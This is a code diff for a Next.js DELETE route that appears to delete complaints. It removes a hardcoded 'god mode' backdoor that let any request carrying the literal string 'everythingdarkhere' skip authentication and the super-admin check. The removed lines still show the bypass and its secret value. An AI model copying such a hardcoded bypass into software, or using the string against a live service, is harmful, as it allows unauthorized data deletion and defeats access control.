@@ -7,15 +7,13 @@ export async function DELETE(request) {
         await dbConnect();
         const authHeader = request.headers.get('authorization');
         const token = extractToken(authHeader);
-        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';
-        if (!isGodMode) {
-            if (!token) {
-                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
-            }
-            const decoded = verifyToken(token);
-            if (!decoded || decoded.role !== 'super-admin') {
-                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
-            }
+
+        if (!token) {
+            return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
+        }
+        const decoded = verifyToken(token);
+        if (!decoded || decoded.role !== 'super-admin') {
+            return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
         }
         const { searchParams } = new URL(request.url);
         const complaintId = searchParams.get('id');
